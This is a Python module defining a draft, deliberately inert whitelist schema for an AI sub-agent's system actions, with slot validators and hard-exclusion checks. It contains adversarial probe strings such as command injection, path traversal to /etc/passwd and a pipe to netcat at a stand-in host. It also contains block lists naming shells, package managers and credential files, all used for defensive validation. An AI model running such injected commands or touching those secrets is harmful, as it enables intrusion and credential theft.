"""
Sub-agent action whitelist -- MECHANISM ONLY, INERT (control 3/3a;
docs/subagent_architecture.md, docs/subagent_whitelist_design.md).

**What this module is**: the ActionSpec schema, the closed set of slot
validators, and the hard-exclusion checks (design doc §5) that together are
the actual security boundary for capability 2 (direct execution) -- "the
whitelist -- not command signing -- is the security boundary" (architecture
doc, corrected threat model). Every function here is pure (no I/O, no global
state); ActionSpec/Slot are frozen dataclasses.

**What this module deliberately is NOT**: `docs/subagent_whitelist_design.md`
is explicitly a DRAFT ("Status: DRAFT -- review-first proposal, NOT a
shippable spec... Do not build capability 2 against this until it's reviewed
and the open decisions are made"). Its §9 lists 7 open decisions (the real
maintainer default set, sensitivity tiers, whether `ufw.allow_from`/any
firewall action is allowed at all, revocation, integrity-protection of
shipped defaults, whether user entries need extra friction, and the
independent security review itself) that belong to "the human owner + an
independent security reviewer" -- not to whoever happens to be writing code.
Accordingly, this module:
  - has no storage/persistence, no user-CRUD, no TUI wiring, no `/whitelist`
    command anywhere;
  - has no signing, no dispatch, no sub-agent-side execution -- capability 2
    remains entirely unbuilt;
  - exposes `list_builtin_action_specs()` returning the design doc §8
    ILLUSTRATIVE starter set for tests/illustration only -- not a shipped
    default set, not registered anywhere the agent or a human could invoke;
  - resolves none of the §9 open decisions (in particular, `ufw.allow_from`
    and any other firewall/reachability action is hard-REJECTED by
    `validate_spec`, matching §9 item 6 being unresolved -- default-deny, not
    a judgment call made here).

The one principle this whole module enforces (design doc §2): an action is a
fixed command template with typed, validated parameter *slots* -- never a
command string, never free text, never a shell. `render_argv` assembles an
argv LIST (never a shell string) from a spec's fixed template plus validated
slot values; nothing here ever concatenates a string into a command.
"""
from __future__ import annotations

import ipaddress
import re
from dataclasses import dataclass, field
from typing import Literal

SlotKind = Literal["enum", "ip", "int_range", "token"]
_VALID_SLOT_KINDS = ("enum", "ip", "int_range", "token")

Layer = Literal["maintainer", "user"]
_VALID_LAYERS = ("maintainer", "user")

Sensitivity = Literal["low", "medium", "high"]
_VALID_SENSITIVITIES = ("low", "medium", "high")


class ActionSpecError(ValueError):
    """An ActionSpec (or a Slot inside it) is not structurally valid -- a
    definition-time failure, never raised by a bad runtime slot VALUE (see
    SlotValueError for that)."""


class HardExclusionError(ActionSpecError):
    """The spec touches one of design doc §5's hard-excluded categories
    (shell/interpreter, credential/secret path, package install, account
    change, or -- pending open decision #9.6 -- a reachability-affecting
    action). Always a hard reject, never a warning."""


class SlotValueError(ValueError):
    """A concrete value supplied for a slot at render time fails that slot's
    validator. Distinct from ActionSpecError: this is about one dispatch
    attempt, not the definition itself."""


# ---------------------------------------------------------------------------
# Slot definitions
# ---------------------------------------------------------------------------

# Adversarial probes a token slot's pattern must NEVER match, regardless of
# whether the default pattern or a spec-supplied custom one is in use --
# checked at slot-DEFINITION time (validate_spec), not just against values
# seen at render time, so a too-permissive custom pattern is caught before it
# is ever used to accept a real value.
_TOKEN_ADVERSARIAL_PROBES: tuple[str, ...] = (
    "; rm -rf /",
    "$(whoami)",
    "`whoami`",
    "../../etc/passwd",
    "/etc/shadow",
    "a && reboot",
    "a || reboot",
    "a | nc evil.example 4444",
    "a\nreboot",
    "a\x00b",
    "a b",
    "-la",
    "--help",
    "a/b",
    "a.b",
)

_DEFAULT_TOKEN_PATTERN = r"^[a-z0-9_][a-z0-9_-]*$"  # no leading '-' -- see _TOKEN_ADVERSARIAL_PROBES ("-la")
_DEFAULT_TOKEN_MAX_LENGTH = 64


@dataclass(frozen=True)
class Slot:
    """One typed, validated parameter slot (design doc §4). `kind` is one of
    the four closed validator types -- there is deliberately no 'path' or
    'freetext'/'string' kind anywhere in this type: a slot that needs a path
    is only ever an `enum` of specific literal allowlisted paths (and even
    then, `validate_spec`'s sensitive-path scan still applies to those
    literal values)."""

    kind: SlotKind
    # enum
    values: tuple[str, ...] | None = None
    # ip
    ip_deny_private: bool = False
    # int_range
    min_value: int | None = None
    max_value: int | None = None
    # token
    pattern: str = _DEFAULT_TOKEN_PATTERN
    max_length: int = _DEFAULT_TOKEN_MAX_LENGTH


@dataclass(frozen=True)
class ActionSpec:
    """One whitelisted action (design doc §3). `effect`/`reversibility`/
    `blast_radius` are part of the definition, authored by a human, and are
    control 7's source of truth for an approval screen -- never LLM-generated
    text. Nothing in this module ever writes to these fields; they exist so a
    future approval UI can read them from a trusted place."""

    id: str
    layer: Layer
    argv_template: tuple[str, ...]
    slots: dict[str, Slot] = field(default_factory=dict)
    effect: str = ""
    reversibility: str = ""
    blast_radius: str = ""
    sensitivity: Sensitivity = "medium"
    requires_typed_execute: bool = True


_PLACEHOLDER_RE = re.compile(r"^\{([a-zA-Z_][a-zA-Z0-9_]*)\}$")

# Shell/interpreter binaries -- an entry naming one of these anywhere in its
# fixed argv is a re-parsed-string command, exactly the pattern design doc §2
# forbids ("never a command string, never free text, never a shell").
_BANNED_SHELL_INTERPRETERS = frozenset({
    "sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "fish",
    "python", "python2", "python3", "perl", "ruby", "node", "php", "lua",
    "eval", "exec", "env", "xargs", "find", "awk",
})

# Arbitrary package installation -- excluded per §5 ("no apt/dnf/pip install
# {name} with a slot"). A fixed, specific package as a reviewed maintainer
# default is a separate, not-yet-made call (open decision, not resolved by
# this module banning the binary outright).
_BANNED_PACKAGE_MANAGERS = frozenset({
    "apt", "apt-get", "aptitude", "dnf", "yum", "zypper",
    "pip", "pip3", "snap", "npm", "gem", "dpkg", "rpm", "brew",
})

# User/privilege/account changes -- excluded from the default set per §5.
_BANNED_ACCOUNT_BINARIES = frozenset({
    "useradd", "userdel", "usermod", "adduser", "deluser",
    "passwd", "chpasswd", "groupadd", "groupdel", "groupmod",
    "gpasswd", "visudo", "su", "sudo",
})

# Reachability-affecting binaries -- §9 open decision 6 ("whether
# ufw.allow_from / any firewall action is allowed at all") is UNRESOLVED, so
# this module default-denies rather than guessing. Revisit only once that
# decision is actually made by the doc's named owner/reviewer.
_BANNED_REACHABILITY_BINARIES = frozenset({
    "ufw", "iptables", "ip6tables", "nft", "firewalld", "firewall-cmd",
})

# Credential/secret-adjacent material -- unreachable, full stop (§5), checked
# against every LITERAL argv token and every enum slot VALUE, case-
# insensitively, regardless of which slot or position it appears in.
_SENSITIVE_PATH_MARKERS: tuple[str, ...] = (
    "authorized_keys",
    "/etc/shadow",
    "/etc/sudoers",
    "sudoers.d",
    ".ssh/",
    "/etc/cron",
    "cron.d",
    "crontab",
    "/etc/systemd/",
    "/lib/systemd/",
    "/usr/lib/systemd/",
    "id_rsa",
    "id_ed25519",
    "id_ecdsa",
    ".pem",
    ".p12",
    ".pfx",
)


def _basename(token: str) -> str:
    return token.rsplit("/", 1)[-1]


def _validate_slot_definition(name: str, slot: Slot) -> None:
    if slot.kind not in _VALID_SLOT_KINDS:
        raise ActionSpecError(f"slot {name!r}: unknown kind {slot.kind!r} (must be one of {_VALID_SLOT_KINDS})")

    if slot.kind == "enum":
        if not slot.values or not isinstance(slot.values, tuple):
            raise ActionSpecError(f"slot {name!r}: an 'enum' slot needs a non-empty tuple of values")
        if any(not isinstance(v, str) or not v for v in slot.values):
            raise ActionSpecError(f"slot {name!r}: enum values must be non-empty strings")
        if len(set(slot.values)) != len(slot.values):
            raise ActionSpecError(f"slot {name!r}: enum values must be unique")
    elif slot.kind == "ip":
        pass  # no required fields beyond the frozen defaults
    elif slot.kind == "int_range":
        if slot.min_value is None or slot.max_value is None:
            raise ActionSpecError(f"slot {name!r}: an 'int_range' slot needs both min_value and max_value")
        if not isinstance(slot.min_value, int) or not isinstance(slot.max_value, int):
            raise ActionSpecError(f"slot {name!r}: min_value/max_value must be ints")
        if slot.min_value > slot.max_value:
            raise ActionSpecError(f"slot {name!r}: min_value must be <= max_value")
    elif slot.kind == "token":
        if slot.max_length <= 0:
            raise ActionSpecError(f"slot {name!r}: max_length must be positive")
        try:
            compiled = re.compile(slot.pattern)
        except re.error as e:
            raise ActionSpecError(f"slot {name!r}: pattern does not compile: {e}") from e
        for probe in _TOKEN_ADVERSARIAL_PROBES:
            if compiled.fullmatch(probe):
                raise ActionSpecError(
                    f"slot {name!r}: pattern {slot.pattern!r} matches the adversarial probe {probe!r} -- "
                    "too permissive for a token slot (no free-text/shell-shaped values allowed)"
                )


def _validate_slot_value(action_id: str, name: str, slot: Slot, value: object) -> None:
    if slot.kind == "enum":
        if not isinstance(value, str) or value not in (slot.values or ()):
            raise SlotValueError(f"{action_id}: slot {name!r} must be one of {slot.values}, got {value!r}")
    elif slot.kind == "ip":
        if not isinstance(value, str):
            raise SlotValueError(f"{action_id}: slot {name!r} must be a string IP address, got {value!r}")
        try:
            addr = ipaddress.ip_address(value)
        except ValueError as e:
            raise SlotValueError(f"{action_id}: slot {name!r} is not a valid IP address: {value!r}") from e
        if slot.ip_deny_private and (addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_reserved or addr.is_multicast):
            raise SlotValueError(f"{action_id}: slot {name!r} rejects private/loopback/reserved addresses, got {value!r}")
    elif slot.kind == "int_range":
        if isinstance(value, bool) or not isinstance(value, int):
            raise SlotValueError(f"{action_id}: slot {name!r} must be an int, got {value!r}")
        if not (slot.min_value <= value <= slot.max_value):
            raise SlotValueError(f"{action_id}: slot {name!r} must be in [{slot.min_value}, {slot.max_value}], got {value!r}")
    elif slot.kind == "token":
        if not isinstance(value, str) or len(value) > slot.max_length or not re.fullmatch(slot.pattern, value):
            raise SlotValueError(f"{action_id}: slot {name!r} failed its token pattern/length check, got {value!r}")
    else:  # pragma: no cover -- validate_spec() already rejects unknown kinds before this can run
        raise SlotValueError(f"{action_id}: slot {name!r} has an unrecognized kind {slot.kind!r}")


def _check_hard_exclusions(spec: ActionSpec, literal_tokens: list[str]) -> None:
    for tok in literal_tokens:
        base = _basename(tok).lower()
        if base in _BANNED_SHELL_INTERPRETERS:
            raise HardExclusionError(
                f"{spec.id}: {tok!r} is a shell/interpreter binary -- an action must be a fixed command, "
                "never one that re-parses a string (design doc §2/§5)"
            )
        if base in _BANNED_PACKAGE_MANAGERS:
            raise HardExclusionError(
                f"{spec.id}: {tok!r} is a package manager -- arbitrary package installation is excluded "
                "(design doc §5; a specific reviewed package is a separate, not-yet-made open decision)"
            )
        if base in _BANNED_ACCOUNT_BINARIES:
            raise HardExclusionError(
                f"{spec.id}: {tok!r} changes user/privilege/account state -- excluded from the default set "
                "(design doc §5)"
            )
        if base in _BANNED_REACHABILITY_BINARIES:
            raise HardExclusionError(
                f"{spec.id}: {tok!r} can affect network/firewall reachability -- excluded pending open "
                "decision #6 (docs/subagent_whitelist_design.md §9), not resolved by this module"
            )

    haystack_parts = [t.lower() for t in literal_tokens]
    for slot in spec.slots.values():
        if slot.kind == "enum":
            haystack_parts.extend(v.lower() for v in (slot.values or ()))
    haystack = " ".join(haystack_parts)
    for marker in _SENSITIVE_PATH_MARKERS:
        if marker in haystack:
            raise HardExclusionError(
                f"{spec.id}: touches credential/secret-adjacent material ({marker!r}) -- unreachable, "
                "full stop (design doc §5)"
            )


def validate_spec(spec: ActionSpec) -> None:
    """Structural validation of an ActionSpec definition -- the definition-
    time half of the whitelist boundary. Raises ActionSpecError (or its
    HardExclusionError subclass for a §5 category) on any violation; returns
    None on success. Deliberately re-run by `render_argv` before every
    dispatch attempt (design doc §4's "validation runs twice, independently"
    -- here that means "never trust a spec object just because it was valid
    once," the same defense-in-depth spirit, even though core/agent-side
    duplication itself isn't built yet)."""
    if not spec.id or not re.fullmatch(r"[a-z][a-z0-9_.]*", spec.id):
        raise ActionSpecError(f"invalid action id {spec.id!r} -- must be a lowercase dotted identifier")
    if spec.layer not in _VALID_LAYERS:
        raise ActionSpecError(f"{spec.id}: layer must be one of {_VALID_LAYERS}, got {spec.layer!r}")
    if spec.sensitivity not in _VALID_SENSITIVITIES:
        raise ActionSpecError(f"{spec.id}: sensitivity must be one of {_VALID_SENSITIVITIES}, got {spec.sensitivity!r}")
    if not spec.argv_template or not isinstance(spec.argv_template, tuple):
        raise ActionSpecError(f"{spec.id}: argv_template must be a non-empty tuple of strings, never a string")
    if any(not isinstance(t, str) or not t for t in spec.argv_template):
        raise ActionSpecError(f"{spec.id}: every argv_template token must be a non-empty string")
    if _PLACEHOLDER_RE.fullmatch(spec.argv_template[0]):
        raise ActionSpecError(
            f"{spec.id}: argv_template[0] (the binary) must be a fixed literal -- an action whose command "
            "itself is a slot is exactly the 'blank the model fills in' hole design doc §5/3a forbids"
        )

    referenced: set[str] = set()
    literal_tokens: list[str] = []
    for tok in spec.argv_template:
        m = _PLACEHOLDER_RE.fullmatch(tok)
        if m:
            referenced.add(m.group(1))
        else:
            if "{" in tok or "}" in tok:
                raise ActionSpecError(
                    f"{spec.id}: token {tok!r} mixes literal text with a slot placeholder -- each token must "
                    "be either fully literal or exactly one whole '{slot}' placeholder"
                )
            literal_tokens.append(tok)

    declared = set(spec.slots)
    if referenced != declared:
        raise ActionSpecError(
            f"{spec.id}: slot/placeholder mismatch -- declared slots {sorted(declared)}, "
            f"referenced in argv_template {sorted(referenced)}"
        )
    for name, slot in spec.slots.items():
        _validate_slot_definition(name, slot)

    if not spec.effect.strip() or not spec.reversibility.strip() or not spec.blast_radius.strip():
        raise ActionSpecError(
            f"{spec.id}: effect/reversibility/blast_radius must all be non-empty, human-authored text "
            "(control 7's source of truth for an approval screen)"
        )

    _check_hard_exclusions(spec, literal_tokens)


def render_argv(spec: ActionSpec, slot_values: dict[str, object]) -> list[str]:
    """Assemble the concrete argv LIST for one dispatch of `spec` with
    `slot_values` -- never a shell string, never string concatenation.
    Re-validates the spec itself first, then every supplied value against its
    slot's validator; any failure is a hard reject (SlotValueError or
    ActionSpecError), never a clamp-and-continue. This function has no
    knowledge of signing, transport, or execution -- it only ever returns a
    list of strings for a caller (not built anywhere yet) to decide what to
    do with."""
    validate_spec(spec)
    provided = set(slot_values)
    declared = set(spec.slots)
    if provided != declared:
        raise SlotValueError(f"{spec.id}: expected exactly the slots {sorted(declared)}, got {sorted(provided)}")
    for name, slot in spec.slots.items():
        _validate_slot_value(spec.id, name, slot, slot_values[name])

    argv: list[str] = []
    for tok in spec.argv_template:
        m = _PLACEHOLDER_RE.fullmatch(tok)
        argv.append(str(slot_values[m.group(1)]) if m else tok)
    return argv


# ---------------------------------------------------------------------------
# Illustrative starter set (design doc §8) -- DRAFT, NOT shipped defaults.
# ---------------------------------------------------------------------------
_DRAFT_BUILTIN_SPECS: tuple[ActionSpec, ...] = (
    ActionSpec(
        id="fail2ban.ban_ip",
        layer="maintainer",
        argv_template=("fail2ban-client", "set", "{jail}", "banip", "{ip}"),
        slots={"jail": Slot(kind="enum", values=("sshd",)), "ip": Slot(kind="ip")},
        effect="Bans one IP address in one fail2ban jail.",
        reversibility="Reversible -- unban with fail2ban.unban_ip.",
        blast_radius="Single IP; no service restart; no data change.",
        sensitivity="low",
    ),
    ActionSpec(
        id="fail2ban.unban_ip",
        layer="maintainer",
        argv_template=("fail2ban-client", "set", "{jail}", "unbanip", "{ip}"),
        slots={"jail": Slot(kind="enum", values=("sshd",)), "ip": Slot(kind="ip")},
        effect="Unbans one IP address in one fail2ban jail.",
        reversibility="Reversible -- re-ban with fail2ban.ban_ip.",
        blast_radius="Single IP; no service restart; no data change.",
        sensitivity="low",
    ),
    ActionSpec(
        id="service.enable_now",
        layer="maintainer",
        argv_template=("systemctl", "enable", "--now", "{unit}"),
        slots={"unit": Slot(kind="enum", values=("fail2ban", "ufw"))},
        effect="Enables and starts one unit from a fixed allowlist.",
        reversibility="Reversible -- service.disable_now on the same unit.",
        blast_radius="One service on the target host.",
        sensitivity="medium",
    ),
    ActionSpec(
        id="service.disable_now",
        layer="maintainer",
        argv_template=("systemctl", "disable", "--now", "{unit}"),
        slots={"unit": Slot(kind="enum", values=("fail2ban", "ufw"))},
        effect="Stops and disables one unit from a fixed allowlist.",
        reversibility="Reversible -- service.enable_now on the same unit.",
        blast_radius="One service on the target host.",
        sensitivity="medium",
    ),
    ActionSpec(
        id="service.restart",
        layer="maintainer",
        argv_template=("systemctl", "restart", "{unit}"),
        slots={"unit": Slot(kind="enum", values=("fail2ban", "ufw"))},
        effect="Restarts one unit from a fixed allowlist.",
        reversibility="Not independently reversible (a restart is a restart), but idempotent/low-risk.",
        blast_radius="One service on the target host; brief service interruption.",
        sensitivity="medium",
    ),
)


def list_builtin_action_specs() -> tuple[ActionSpec, ...]:
    """The design doc §8 ILLUSTRATIVE starter set, for tests/illustration
    ONLY. NOT a shipped default set (§9 open decision 1 is unresolved), NOT
    registered in any tool/action registry, and NOT reachable from the agent,
    the TUI, or any dispatch path -- none of that exists yet. A real shipped
    maintainer default set requires the human owner + the independent
    security review the design doc calls for."""
    return _DRAFT_BUILTIN_SPECS
